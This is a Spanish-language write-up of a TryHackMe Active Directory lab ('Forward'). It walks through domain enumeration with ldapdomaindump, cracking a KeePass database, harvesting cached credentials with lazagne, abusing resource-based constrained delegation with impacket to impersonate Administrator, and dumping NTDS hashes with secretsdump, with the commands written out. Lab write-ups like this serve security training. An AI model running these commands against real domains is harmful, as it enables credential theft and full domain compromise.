# Forward - TryHackMe

**Fecha de resolución:** 23 de agosto de 2026

Entorno Active Directory, dominio `ctf.local`, DC `DC01`. Planteado como assume breach: se parte ya con credenciales válidas de un usuario del dominio.

## Acceso inicial

Credenciales de partida:

```
ctf.local\j.smith : JSmith@IT2024
```

Con ellas, RDP directo a un equipo del dominio para operar desde dentro.

## Enumeración de Active Directory

Con esas credenciales volqué el dominio completo (usuarios, grupos, equipos, política de contraseñas y trusts):

```
ldapdomaindump -u ctf.local\\j.smith -p JSmith@IT2024 dc01.ctf.local
```

quedando los `.grep/.html/.json` de usuarios, grupos, computadoras, política de dominio y trusts. Entre los usuarios destaca `svc.helpdesk`, marcado como `TRUSTED_TO_AUTH_FOR_DELEGATION`, y un grupo `sysadmin` explícitamente exento de AppLocker.

## Credenciales adicionales

En un recurso compartido apareció una base de datos KeePass (`Database.kdbx`). Extraje el hash con `keepass2john.py` y lo crackeé (offline, hash limpio en `clean_hash.txt`), lo que dio acceso a la base y a credenciales adicionales guardadas dentro. También corrí `lazagne.exe` en el host donde tenía sesión para recoger cualquier credencial en caché de aplicaciones locales.

## Escalada vía RBCD

Con una cuenta con permisos suficientes sobre `DC01` (vía las credenciales recuperadas del KeePass), configuré Resource-Based Constrained Delegation a mi favor:

```
impacket-rbcd -delegate-from 'EQUIPO_CONTROLADO$' -delegate-to 'DC01$' -action write ctf.local/usuario:contraseña
```

y con eso solicité un ticket de servicio impersonando a Administrator contra el servicio CIFS de DC01:

```
impacket-getST -spn cifs/DC01.ctf.local -impersonate Administrator ctf.local/'EQUIPO_CONTROLADO$':contraseña
```

quedando el ticket guardado como `Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache`.

## Dominio comprometido

Con `KRB5CCNAME` apuntando a ese ccache, volqué los hashes del controlador de dominio:

```
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
impacket-secretsdump -k -no-pass DC01.ctf.local
```

obteniendo el NTDS completo (`hashes.txt`) y control total sobre `ctf.local`.

---

GitHub: [github.com/germanvegaa](https://github.com/germanvegaa)
TryHackMe: [tryhackme.com/p/G3RM4N](https://tryhackme.com/p/G3RM4N)
HackTheBox: [app.hackthebox.com/public/users/3990132](https://app.hackthebox.com/public/users/3990132)
